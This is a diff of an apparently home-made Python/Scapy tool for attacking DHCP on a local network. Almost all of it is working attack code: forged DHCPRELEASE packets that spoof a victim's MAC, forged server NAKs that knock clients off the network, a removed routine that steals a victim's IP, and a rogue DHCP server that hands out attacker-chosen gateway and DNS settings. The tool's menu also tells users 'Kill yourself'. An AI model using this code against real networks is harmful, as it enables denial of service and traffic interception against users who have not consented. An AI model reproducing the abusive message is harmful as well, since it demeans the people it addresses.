@@ -3,6 +3,17 @@ from datetime import datetime
 import sys
 import socket
 
+# Dictionary to store DHCP bindings
+dhcp_bindings = {}
+DHCP_SERVER_IP_ADDRESS = "192.168.0.1"
+dhcp_bindings["DC:97:BA:17:82:BA"] = "192.168.0.116"
+MY_MAC = "DC:97:BA:17:82:BA"
+ip_pool = ["192.168.1." + str(i) for i in range(100, 110)]
+gateway_ip = "192.168.1.1"
+dns_server_ip = "192.168.1.1"
+
+leases = {}
+    
 def get_local_ip():
     try:
         # Connect to an external IP (Google DNS) without sending data
@@ -13,59 +24,11 @@ def get_local_ip():
         return local_ip
     except Exception as e:
         return f"Error: {e}"
-# Dictionary to store DHCP bindings
-dhcp_bindings = {}
-DHCP_SERVER_IP_ADDRESS = "192.168.0.1"
-def print_banner():
-    banner = r"""                                                                                                    
-                                                                                    
-                                                                                    
-                                             @                                      
-                                          @@%@                                      
-                                         @@%@                                       
-                                         @@%@                                       
-                                       @@%%%%@                                      
-                                      @@%%%%@                                       
-                                     @%%%%#%@                                       
-                                     @%#*+++*                                       
-                                     *++++++*                                       
-                                    #+++++++*                                       
-                                   %+++++++*%                                       
-                                  @*++++++++@                                       
-                                  #*++++++++@                                       
-                               @*+++++++++++**@                                     
-                             #*++++++++++++++++#                                    
-                           #*+++++*@##++++++++++*#                                  
-                         %**+***#%@%@#++++++++++++##***#*+++*#@%@@                  
-                         *+*##***%#%%+++++++++***+++++++++++*%%%%@@                 
-                         #+##**#++++++++++++*@%#%#++++++++++*%%%%%@@                
-                         @**++%@+++++++++++*@#%%@*++++++++*%   @%%%%@@              
-                          @+++%@============@*@@%*++++*%%         @%%@@             
-                           *===####@#========+*+==++#               @%@             
-                            #=======@%+====+***====+#        @@                     
-                             #========+@++#%***+===#     @%####%                    
-                             %*++=======##****====@   %%#######%@                   
-                            @*+++++++===========#%  @%#######%#%@                   
-                           @*++++++++++*#####%@   @%###%%######%                    
-                           *+++++++++++++@       %###%#%####*#                      
-                          %+++===========+*@    @%########%@                        
-                         %++================%     %##%@                             
-                         +======*#===*%======%  %#####%                             
-                        *=======**===+%=======@%#**#%@                              
-                        *=====================+ @#*#%                               
-                       %======================+%###@                                
-                  #++++========================+*%                                  
-                   @%%#*+===========================+*                              
-                 @@@@@@%%*==+#%%#====*%#+=====#%%%@@@                               
-                                   %# @@   %### @@                                  
-                                                                                    
-                                                                                    
-                                                                                                                                                                  
-                       
-    """
-    print(banner)
-    print("DeeHeijSeePeeV1.0\n")
-    print("Press S to map MAC addresses on victim devices, H for help, or Q to quit.\n")
+
+def GetDHCPMac():
+    first_key = next(iter(dhcp_bindings))
+    
+    return first_key
 
 def get_mac_from_ip(ip, bindings):
     for mac, bound_ip in bindings.items():
@@ -73,123 +36,20 @@ def get_mac_from_ip(ip, bindings):
             return mac
     return None  # not found
 
-def forge_false_release(ip_address, number_of_times=1):   
-    """
-    Forge a DHCP Release packet to drop an IP address.
-    """
-    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
-    print(f"MAC address for {ip_address} is {mac_address}")
-    for _ in range(int(number_of_times)):
-        print("starting DHCP release")
-        #p = chaddr=bytes.fromhex("60:b9:c0:3b:96:21".replace(":",""))
-        print("MAC ADDRESS", mac_address)
-        
-        # Convert MAC to raw 16-byte chaddr field (6 bytes for MAC, padded to 16)
-        mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
-
-        # Craft DHCPRELEASE packet
-        packet = (
-            Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
-            IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) /
-            UDP(sport=68, dport=67) /
-            BOOTP(op=1, chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
-            DHCP(options=[
-                ("message-type", "release"),
-                ("server_id", DHCP_SERVER_IP_ADDRESS),
-                ("client_id", b'\x01'+  bytes.fromhex(mac_address.replace(":", ""))),
-                ("end")
-            ]) / 
-            Raw(load=b'\x00' * 43)
-        )
-
-        # Send the packet (update iface to match your interface)
-        sendp(packet, iface="Ethernet 2", verbose=1)
-        
-        # send(Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
-        #     IP(src=ip_address,dst=DHCP_SERVER_IP_ADDRESS) / 
-        #     UDP(sport=68,dport=67) /
-        #     BOOTP(chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
-        #     DHCP(options=[("message-type","release"), ("server_id",DHCP_SERVER_IP_ADDRESS), 'end']))
-        
-        # # packet = Ether(src=mac_address, dst=p) / \
-        # #         IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
-        # #         UDP(sport=68, dport=67) / \
-        # #             BOOTP(op=1, chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=RandInt()) / \
-        # #             DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
-        # # send(packet, verbose=False)
-        # print(f"Sent DHCP Release for {ip_address} from {mac_address}")
-        print("Die")
-
-
-def drop_and_mimic(ip_address, number_of_times=1):
-    """
-    Drop an IP address and craft a DHCPREQUEST to steal the IP address.
-    """
-    xid = random.randint(1, 0xFFFFFFFF)
-    mac_address = get_mac_from_ip(ip_address, dhcp_bindings)
-    if not mac_address:
-        print(f"MAC address for {ip_address} not found in bindings.")
-        return
-    mac = get_if_hwaddr(iface)
-    forge_false_release(ip_address, number_of_times)
-    print(f"Dropped IP {ip_address} for MAC {mac_address} and mimicked DHCP release.") 
-    print(f"Attempting to steal IP {ip_address}...")    
-    
-    dhcp_request = (
-        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-        IP(src="0.0.0.0", dst="255.255.255.255") /
-        UDP(sport=68, dport=67) /
-        BOOTP(chaddr=mac2str(mac), xid=xid, flags=0x8000) /
-        DHCP(options=[
-            ("message-type", "request"),
-            ("server_id", DHCP_SERVER_IP_ADDRESS),
-            ("requested_addr", ip_address),
-            ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
-            "end"
-        ])
-    )
-
-    print(f"Sending DHCPREQUEST for {ip_address} to server...")
-    sendp(dhcp_request, iface=iface, verbose=0)
-
-    # Optionally, wait for DHCPACK to confirm
-    print("Waiting for DHCPACK...")
-    ack = sniff(
-        iface=iface,
-        filter="udp and (port 67 or 68)",
-        stop_filter=lambda p: DHCP in p and p[DHCP].options[0][1] == 5 and p[BOOTP].xid == xid,
-        timeout=10
-    )
-
-    if ack:
-        ack_packet = ack[0]
-        print(f"Received DHCPACK: lease confirmed for {ack_packet[BOOTP].yiaddr}")
-    else:
-        print("No DHCPACK received.")
-    
-    
-def drop_all_address_in_mimic_table():  
-    """
-    Attempt to drop all active DHCP requests in the mimic table.
-    """
-    if not dhcp_bindings:
-        print("\nNo DHCP bindings to drop.\n")
-        return
-    for mac, ip in dhcp_bindings.items():
-        forge_false_release(mac, ip)
-        print(f"Dropped IP {ip} for MAC {mac}")
+def directAttack(ip_address):
+    '''Send a Release to the DHCP Server, then send a NACK to the victim device.'''
+    print(f"Directly attacking {ip_address}...")
+    forge_false_release(ip_address, 1)  # Send DHCP Release
+    forge_false_NACK(ip_address, 1)  # Send DHCP NACK to invalidate IP address
+    '''now with the rogue DHCP server, Send a DHCP offer to the victim device with a different IP address.'''
 
 
 def print_help():   
-    print("TCP DHCP Releaser Help:")
+    print("DHCP injector:")
     print("S - Map TCP connections of other devices")
-    print("RA - Release all DHCP bindings")
-    print("R - Release a specific IP address (syntax: R -<ip> <param> [-m])")
-    print("H - Show this help message")
-    print("P - Print current DHCP bindings")
+    print("A <IP> - Directly attack a specific IP address")
     print("Q - Quit the program")
     print("\nNote: This tool is designed to work with devices in the same VLAN and requires appropriate permissions to send TCP ACK requests.")
-
 
 def print_bindings():
     """
@@ -287,45 +147,183 @@ def tcp_syn_scan_dynamic():
             print(response)
             print(f"[?] Unexpected response from {ip}")
 
+def forge_false_release(ip_address, number_of_times=1):   
+    """
+    Forge a DHCP Release packet to drop an IP address.
+    """
+    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
+    print(f"MAC address for {ip_address} is {mac_address}")
+    for _ in range(int(number_of_times)):
+        print("starting DHCP release")
+        #p = chaddr=bytes.fromhex("60:b9:c0:3b:96:21".replace(":",""))
+        print("MAC ADDRESS", mac_address)
+        
+        # Convert MAC to raw 16-byte chaddr field (6 bytes for MAC, padded to 16)
+        mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
+
+        # Craft DHCPRELEASE packet
+        packet = (
+            Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
+            IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) /
+            UDP(sport=68, dport=67) /
+            BOOTP(op=1, chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
+            DHCP(options=[
+                ("message-type", "release"),
+                ("server_id", DHCP_SERVER_IP_ADDRESS),
+                ("client_id", b'\x01'+  bytes.fromhex(mac_address.replace(":", ""))),
+                ("end")
+            ]) / 
+            Raw(load=b'\x00' * 43)
+        )
+
+        # Send the packet (update iface to match your interface)
+        sendp(packet, iface="Ethernet 2", verbose=0)
+        
+        # send(Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
+        #     IP(src=ip_address,dst=DHCP_SERVER_IP_ADDRESS) / 
+        #     UDP(sport=68,dport=67) /
+        #     BOOTP(chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
+        #     DHCP(options=[("message-type","release"), ("server_id",DHCP_SERVER_IP_ADDRESS), 'end']))
+        
+        # # packet = Ether(src=mac_address, dst=p) / \
+        # #         IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
+        # #         UDP(sport=68, dport=67) / \
+        # #             BOOTP(op=1, chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=RandInt()) / \
+        # #             DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
+        # # send(packet, verbose=False)
+        # print(f"Sent DHCP Release for {ip_address} from {mac_address}")
+        print("Die")
 
 def forge_false_NACK(ip_address, number_of_times=1):
     """
     Forge a DHCP NACK packet to force client to invalidate its IP address.
     """
-    mac_address = get_mac_from_ip(ip_address, dhcp_bindings)
+    print("starting DHCP NACK")
+    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
+    print("MAC ADDRESS", mac_address)
+    
+    mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
     if not mac_address:
         print(f"MAC address for {ip_address} not found in bindings.")
         return
-
+    mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
     for i in range(number_of_times):
+        
+        packet = (
+            Ether(src=GetDHCPMac(), dst=mac_address) /
+            IP(src=DHCP_SERVER_IP_ADDRESS, dst=ip_address) /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, siaddr=DHCP_SERVER_IP_ADDRESS,  chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
+           DHCP(options=[
+            ("message-type", "nak"),
+            ("server_id", DHCP_SERVER_IP_ADDRESS),
+            "end"
+            ]) / 
+            Raw(load=b'\x00' * 43)
+        )
+        
             # Create BOOTP and DHCP layers separately
-            bootp = BOOTP(
-                op=2,
-                yiaddr="0.0.0.0",
-                chaddr=mac2str(mac_address),
-                ciaddr=ip_address,
-                xid=RandInt()
-            )
+            # bootp = BOOTP(
+            #     op=2,
+            #     yiaddr="0.0.0.0",
+            #     chaddr=mac2str(mac_address),
+            #     ciaddr=ip_address,
+            #     xid=RandInt()
+            # )
 
-            dhcp = DHCP(options=[
-                ("message-type", "nak"),
-                ("server_id", DHCP_SERVER_IP_ADDRESS),
-                "end"
-            ])
+            # dhcp = DHCP(options=[
+            #     ("message-type", "nak"),
+            #     ("server_id", DHCP_SERVER_IP_ADDRESS),
+            #     "end"
+            # ])
 
-            # Construct full packet
-            packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
-                    IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
-                    UDP(sport=67, dport=68) / \
-                    bootp / dhcp
+            # # Construct full packet
+            # packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
+            #         IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
+            #         UDP(sport=67, dport=68) / \
+            #         bootp / dhcp
 
             # Send packet
-            sendp(packet, verbose=1)
-            print(f"Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")
+        sendp(packet, verbose=0)
+        print(f"[+] Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")
 
+def get_free_ip(mac):
+        ip = ip_pool.pop(0)
+        leases[mac] = ip
+        return ip
+
+def send_dhcp_ack(mac, mac_bytes, xid, ip_address):
+    ack_pkt = (
+        Ether(src=MY_MAC, dst=mac) /
+        IP(src=gateway_ip, dst="255.255.255.255") /
+        UDP(sport=67, dport=68) /
+        BOOTP(op=2, yiaddr=ip_address, siaddr=gateway_ip, chaddr=mac_bytes, xid=xid) /
+        DHCP(options=[
+            ("message-type", "ack"),
+            ("server_id", gateway_ip),
+            ("router", gateway_ip),
+            ("name_server", dns_server_ip),
+            ("lease_time", 3600),
+            "end"
+        ])
+    )
+    sendp(ack_pkt, verbose=False)
+    print(f"[+] Sent DHCPACK to {mac} confirming {ip_address}")
+
+def wait_for_dhcp_request(xid, mac, timeout=5):
+    """Sniff for DHCPREQUEST from the target MAC and XID"""
+    def match(pkt):
+        return (DHCP in pkt and
+                pkt[Ether].src == mac and
+                pkt[BOOTP].xid == xid and
+                pkt[DHCP].options[0][1] == 3)  # DHCPREQUEST
+
+    print(f"[*] Waiting for DHCPREQUEST from {mac} (xid={xid})...")
+    pkt = sniff(filter="udp and (port 67 or 68)", timeout=timeout, count=1, lfilter=match)
+    return pkt[0] if pkt else None
+
+def forge_false_offer(ip_address, number_of_times=5):
+    mac = get_mac_from_ip(ip_address, dhcp_bindings)
+    if not mac:
+        print(f"[!] No MAC mapping found for {ip_address}")
+        return
+
+    mac_bytes = bytes.fromhex(mac.replace(":", "")) + b'\x00' * 10
+    success = False
+
+    for attempt in range(number_of_times):
+        xid = random.randint(0, 0xFFFFFFFF)
+        offered_ip = get_free_ip(mac)
+
+        offer_pkt = (
+            Ether(src=MY_MAC, dst=mac) /
+            IP(src=gateway_ip, dst="255.255.255.255") /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, yiaddr=offered_ip, siaddr=gateway_ip, chaddr=mac_bytes, xid=xid) /
+            DHCP(options=[
+                ("message-type", "offer"),
+                ("server_id", gateway_ip),
+                ("router", gateway_ip),
+                ("name_server", dns_server_ip),
+                ("lease_time", 3600),
+                "end"
+            ])
+        )
+        sendp(offer_pkt, verbose=False)
+        print(f"[+] Sent DHCPOFFER to {mac} offering {offered_ip} (attempt {attempt + 1})")
+
+        req = wait_for_dhcp_request(xid, mac)
+        if req:
+            send_dhcp_ack(mac, mac_bytes, xid, offered_ip)
+            success = True
+            break
+        else:
+            print(f"[!] No DHCPREQUEST received (attempt {attempt + 1})")
+
+    if not success:
+        print(f"[!] Failed to complete DHCP handshake with {mac} after {number_of_times} tries")
 
 def main():
-    print_banner()
     print("Press H for help or Q to quit.\n")
     while True:
         choice = input(">> ").strip().upper()
@@ -343,26 +341,15 @@ def main():
             sys.exit(0)
         elif choice == "P":
             print_bindings()
-        elif choice.startswith("R "):
+        elif choice.startswith("A "):
             parts = choice.split()
-            if len(parts) >= 3 and parts[1].startswith("-"):
+            if len(parts) >= 2:
                 ip = parts[1][1:]  # Remove the dash
-                param = parts[2]
-                use_mimic = "-m" in parts
-
-                if use_mimic:
-                    try:
-                        tries = int(param)
-                        drop_and_mimic(ip, tries)
-                    except ValueError:
-                        if use_mimic:
-                            print("Mimicing requires a number of tries.")
-                        else:
-                            forge_false_release(ip,1)
-                else:
-                    forge_false_release(ip, param)
-            else:
-                print("Invalid syntax. Use: R -<ip> <tryCount> [-m]")
+                directAttack(ip)
+        elif choice == "T":
+            print("Sending testing NACK to my own address")
+            forge_false_NACK("192.168.0.116", 1)  
+            forge_false_offer("192.168.0.116", 5)
         else:
             print("Invalid choice. Kill yourself \n")
 
